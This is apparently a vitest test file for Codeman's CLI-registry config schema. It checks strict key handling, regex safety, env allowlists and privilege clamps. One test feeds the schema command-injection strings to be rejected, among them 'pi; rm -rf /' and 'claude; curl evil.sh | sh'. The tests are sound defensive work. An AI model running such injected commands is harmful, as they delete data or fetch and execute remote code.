/**
 * @fileoverview Validation rules for a `CliEntry`.
 *
 * `~/.codeman/clis.json` is hand-editable and selects the binaries Codeman spawns, so this
 * schema is a security boundary, not a typo-catcher. Two properties carry that weight:
 *
 *  - **Everything is `.strict()`.** An unknown key is a hard error. On a permissive schema a
 *    misspelled field name degrades to "field absent → the permissive default applies",
 *    which is the worst possible failure mode for a field like `privilegedEnvKeys`.
 *  - **No shell text can reach the command line.** Every literal is checked against a
 *    safe-word pattern at LOAD time, and a literal that fails REJECTS THE WHOLE ENTRY rather
 *    than being dropped — a silently dropped flag would change security-relevant behaviour
 *    (losing `--no-approve` is not a cosmetic difference).
 *
 * Port: none (pure schema).
 */

import { describe, it, expect } from 'vitest';
import { CliEntrySchema } from '../src/config/cli-registry/schema.js';
import { compileVersionRegex } from '../src/config/cli-registry/patterns.js';
import { STOCK_CLIS } from '../src/config/cli-registry/stock.js';
import type { CliEntry } from '../src/config/cli-registry/types.js';

/** A deep clone of a shipped entry, as the base for "valid except for X" cases. */
function baseEntry(id = 'pi'): Record<string, unknown> {
  const found = STOCK_CLIS.find((e) => (e.id as string) === id);
  if (!found) throw new Error(`no stock entry ${id}`);
  return JSON.parse(JSON.stringify(found)) as Record<string, unknown>;
}

function expectRejected(mutate: (entry: Record<string, unknown>) => void, because: string): void {
  const entry = baseEntry();
  mutate(entry);
  const result = CliEntrySchema.safeParse(entry);
  expect(result.success, `expected rejection: ${because}`).toBe(false);
}

describe('customModelInjection.launchModel', () => {
  it('rejects a template with characters the argv engine would have to quote', () => {
    expectRejected((e) => {
      const caps = e.capabilities as Record<string, unknown>;
      caps.customModelInjection = { ...(caps.customModelInjection as object), launchModel: 'custom/{modelId} --yolo' };
    }, 'a space in the launch-model template');
    expectRejected((e) => {
      const caps = e.capabilities as Record<string, unknown>;
      caps.customModelInjection = { ...(caps.customModelInjection as object), launchModel: '' };
    }, 'an empty launch-model template');
  });

  it('accepts the placeholder form the stock entries use', () => {
    const entry = baseEntry();
    const caps = entry.capabilities as Record<string, unknown>;
    caps.customModelInjection = { ...(caps.customModelInjection as object), launchModel: 'custom/{modelId}' };
    expect(CliEntrySchema.safeParse(entry).success).toBe(true);
  });
});

describe('the shipped catalog', () => {
  it('validates every stock entry exactly as shipped', () => {
    // If this fails, the catalog cannot load at all — every other test here is downstream.
    for (const entry of STOCK_CLIS) {
      const result = CliEntrySchema.safeParse(entry);
      expect(
        result.success,
        `stock entry "${entry.id as string}" failed: ${JSON.stringify(result.error?.issues)}`
      ).toBe(true);
    }
    expect(STOCK_CLIS.length).toBeGreaterThanOrEqual(9);
  });

  it('ships every entry with a unique id and order', () => {
    const ids = STOCK_CLIS.map((e) => e.id as string);
    expect(new Set(ids).size).toBe(ids.length);
    const orders = STOCK_CLIS.map((e) => e.order);
    expect(new Set(orders).size).toBe(orders.length);
  });
});

describe('strictness', () => {
  it('rejects an unknown key at the top level', () => {
    expectRejected((e) => {
      e.unknownField = true;
    }, 'a typo must not degrade to a permissive default');
  });

  it('rejects an unknown key deep inside capabilities', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).newSwitch = true;
    }, 'strictness has to hold at every depth, not just the top');
  });

  it('rejects an unknown key inside discovery', () => {
    expectRejected((e) => {
      (e.discovery as Record<string, unknown>).probeEverything = true;
    }, 'strictness has to hold at every depth');
  });
});

describe('workDetect.workingLine is guarded like every other config regex', () => {
  it('rejects a nested quantifier', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).workDetect = { promptGlyph: '>', workingLine: '(a+)+b' };
    }, 'this pattern is compiled once and then run against every accumulated PTY chunk, so catastrophic backtracking here freezes the event loop for the whole server');
  });

  it('rejects a source longer than compileVersionRegex() will compile', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).workDetect = { promptGlyph: '>', workingLine: 'a'.repeat(201) };
    }, 'the schema must not accept a pattern the runtime will then refuse to compile, or the CLI silently falls back to the Claude pattern');
  });

  it('rejects a pattern that is not a regex at all', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).workDetect = { promptGlyph: '>', workingLine: '([unclosed' };
    }, 'a broken pattern must fail at LOAD time, not inside the PTY data handler');
  });

  it('accepts both shipped patterns unchanged', () => {
    for (const entry of STOCK_CLIS) {
      const src = entry.capabilities.workDetect?.workingLine;
      if (!src) continue;
      expect(compileVersionRegex(src), `${entry.id} declares a workingLine the guard refuses`).not.toBeNull();
    }
  });

  it('holds the optional watchingLine to the same guard', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).workDetect = {
        promptGlyph: '>',
        workingLine: 'working',
        watchingLine: '(a+)+b',
      };
    }, 'this one runs over a pane capture every time a session settles, so it can freeze the event loop the same way');
  });

  it('bounds how far up the screen a config file may search', () => {
    // The window is the injection guard: every row it adds is another row the agent
    // itself may be able to write, and the label is what silences an idle alert.
    for (const lines of [0, 9, 2.5]) {
      expectRejected((e) => {
        (e.capabilities as Record<string, unknown>).workDetect = {
          promptGlyph: '>',
          workingLine: 'working',
          watchingLine: 'chip (\\d+)',
          watchingLines: lines,
        };
      }, 'a config file must not be able to widen the search to the whole pane');
    }
  });

  it('refuses a window with no pattern to bound', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).workDetect = {
        promptGlyph: '>',
        workingLine: 'working',
        watchingLines: 3,
      };
    }, 'a window with nothing to search is a typo whose failure is otherwise silent');
  });

  it('accepts every shipped watchingLine', () => {
    for (const entry of STOCK_CLIS) {
      const src = entry.capabilities.workDetect?.watchingLine;
      if (!src) continue;
      expect(compileVersionRegex(src), `${entry.id} declares a watchingLine the guard refuses`).not.toBeNull();
    }
  });
});

describe('no shell text can reach the command line', () => {
  it('rejects a literal carrying shell metacharacters', () => {
    for (const evil of ['pi; rm -rf /', 'pi && curl evil.sh', 'pi`whoami`', 'pi $(id)', 'pi | tee', 'pi > /etc/x']) {
      expectRejected(
        (e) => {
          const launch = e.launch as { variants: Array<{ args: unknown[] }> };
          launch.variants[0].args[0] = { lit: evil };
        },
        `literal ${JSON.stringify(evil)} must be refused`
      );
    }
  });

  it('rejects a fixed flag VALUE carrying shell metacharacters', () => {
    expectRejected((e) => {
      const launch = e.launch as { variants: Array<{ args: unknown[] }> };
      launch.variants[0].args.push({ flag: '--model', value: 'a`b`' });
    }, 'a fixed value is a literal too');
  });

  it('rejects a flag that does not look like a flag', () => {
    expectRejected((e) => {
      const launch = e.launch as { variants: Array<{ args: unknown[] }> };
      launch.variants[0].args.push({ flag: 'rm -rf /' });
    }, 'a flag must match -x / --long-flag');
  });

  it('rejects an overlay command that is more than bare words', () => {
    expectRejected((e) => {
      e.overlays = { remote: { command: 'claude; curl evil.sh | sh' } };
    }, 'overlay commands are one bare command plus bare flags, not an escape hatch into shell');
  });
});

describe('cross-field integrity', () => {
  it('rejects a valueFrom naming an undeclared param', () => {
    expectRejected((e) => {
      const launch = e.launch as { variants: Array<{ args: unknown[] }> };
      launch.variants[0].args.push({ flag: '--model', valueFrom: 'noSuchParam' });
    }, 'a dangling valueFrom silently emits nothing');
  });

  it('rejects a capabilityGate naming an undeclared gate', () => {
    expectRejected((e) => {
      const launch = e.launch as { variants: Array<{ args: unknown[] }> };
      launch.variants[0].args.push({ flag: '--new', when: { capabilityGate: 'noSuchGate' } });
    }, 'an unknown gate never passes, so the flag would be silently unreachable');
  });

  it('rejects a fallback chain whose last variant is conditional', () => {
    expectRejected((e) => {
      const launch = e.launch as Record<string, unknown>;
      launch.chain = 'fallback';
      (launch.variants as Array<Record<string, unknown>>)[0].when = { param: 'model', state: 'set' };
    }, 'the terminal case of a fallback chain must be guaranteed to render');
  });

  it('rejects a legacyConfigAliases key naming an undeclared param', () => {
    expectRejected((e) => {
      (e.launch as Record<string, unknown>).legacyConfigAliases = { nope: 'resumeSessionId' };
    }, 'an alias for a param that does not exist can never apply');
  });

  it('rejects a configSetenv reading an undeclared param', () => {
    // Losing this mapping for DeepSeek would silently drop a permission clamp.
    expectRejected((e) => {
      (e.env as Record<string, unknown>).configSetenv = [{ name: 'DSH_PERMISSION_MODE', fromParam: 'nope' }];
    }, 'exporting from a param that does not exist would export nothing, silently');
  });

  it('rejects a privilegedParams clamp naming an undeclared param', () => {
    // The security-relevant twin of the configSetenv case above, and the sharper of the two:
    // `privilegedParams[].param` is the multi-user bypass clamp's only handle on a CLI's
    // privilege switch, and a wrong name there clamps NOTHING with no error anywhere.
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).privilegedParams = [{ param: 'nope', clampTo: false }];
    }, 'clamping a param that does not exist would silently stop clamping');
  });

  it('names privilegedParams in the LAUNCH-PARAM namespace, not the legacy wire one', () => {
    // codex is the entry where the two names differ, so it is the one that catches a
    // regression here. Naming the wire field (`dangerouslyBypassApprovals`) instead of the
    // param (`bypassApprovals`) must be a load-time REJECTION, not a silent no-op — and the
    // shipped entry must be on the param side of that line.
    const codex = STOCK_CLIS.find((e) => (e.id as string) === 'codex');
    expect(codex).toBeDefined();
    expect(codex!.capabilities.privilegedParams.map((c) => c.param)).toEqual(['bypassApprovals']);
    expect(codex!.launch.legacyConfigAliases?.bypassApprovals).toBe('dangerouslyBypassApprovals');

    const wrong = baseEntry('codex');
    (wrong.capabilities as Record<string, unknown>).privilegedParams = [
      { param: 'dangerouslyBypassApprovals', clampTo: false },
    ];
    expect(CliEntrySchema.safeParse(wrong).success).toBe(false);
  });

  it('rejects a profile name this build does not implement', () => {
    expectRejected((e) => {
      (e.discovery as Record<string, unknown>).launcherProfile = 'no-such-profile';
    }, 'an unimplemented launcher profile fails closed and the CLI looks permanently uninstalled');
    expectRejected((e) => {
      (e.env as Record<string, unknown>).setenvProfile = 'no-such-profile';
    }, 'an unimplemented setenv profile silently skips setup the CLI needs');
  });
});

describe('the env allowlist cannot be widened by config', () => {
  it('requires a prefix to end with an underscore', () => {
    expectRejected((e) => {
      (e.env as Record<string, unknown>).allowedPrefixes = ['CLAUDE'];
    }, 'a prefix without a trailing _ matches more namespaces than it names');
  });

  it('rejects a prefix short enough to swallow unrelated namespaces', () => {
    // The anti-widening case: `P_` would admit PATH-adjacent and every other P namespace at
    // once, and the allowlist is ONE GLOBAL LIST applied to every mode.
    expectRejected((e) => {
      (e.env as Record<string, unknown>).allowedPrefixes = ['P_'];
    }, 'a 2-char prefix is too broad for a global allowlist');
  });

  it('rejects an env NAME that is not UPPER_SNAKE_CASE', () => {
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).privilegedEnvKeys = ['dsh-permission-mode'];
    }, 'env names are UPPER_SNAKE_CASE; anything else would never match a real key');
  });
});

describe('identity', () => {
  it('rejects an id that is not a lowercase kebab token', () => {
    for (const bad of ['Pi', 'my cli', '1pi', 'pi/../x', '']) {
      const entry = baseEntry();
      entry.id = bad;
      expect(CliEntrySchema.safeParse(entry).success, `id ${JSON.stringify(bad)} must be refused`).toBe(false);
    }
  });

  it('rejects an accent that is not a 6-digit hex colour', () => {
    expectRejected((e) => {
      e.accent = 'red';
    }, 'the accent is interpolated into CSS');
  });

  it('accepts a well-formed custom entry built from a stock one', () => {
    const entry = baseEntry();
    entry.id = 'my-cli';
    entry.label = 'My CLI';
    entry.stock = false;
    expect(CliEntrySchema.safeParse(entry).success).toBe(true);
  });
});

describe('capability shapes', () => {
  it('accepts only the three hook states', () => {
    for (const value of ['none', 'always', 'supervised']) {
      const entry = baseEntry();
      (entry.capabilities as Record<string, unknown>).hooks = value;
      expect(CliEntrySchema.safeParse(entry).success, `hooks=${value}`).toBe(true);
    }
    // A boolean was the old shape and must NOT quietly work — `true` would have to mean
    // 'always', which is wrong for a supervised CLI.
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).hooks = true;
    }, 'hooks is a tri-state, not a boolean');
  });

  it('accepts only known transcript readers', () => {
    const entry = baseEntry() as unknown as CliEntry;
    for (const value of ['claude-jsonl', 'codex-rollout', 'deepseek-zstd', 'none']) {
      const candidate = baseEntry();
      (candidate.capabilities as Record<string, unknown>).transcript = value;
      expect(CliEntrySchema.safeParse(candidate).success, `transcript=${value}`).toBe(true);
    }
    expect(entry.capabilities.transcript).toBeDefined();
    expectRejected((e) => {
      (e.capabilities as Record<string, unknown>).transcript = 'some-future-format';
    }, 'a transcript reader that does not exist would silently read nothing');
  });
});
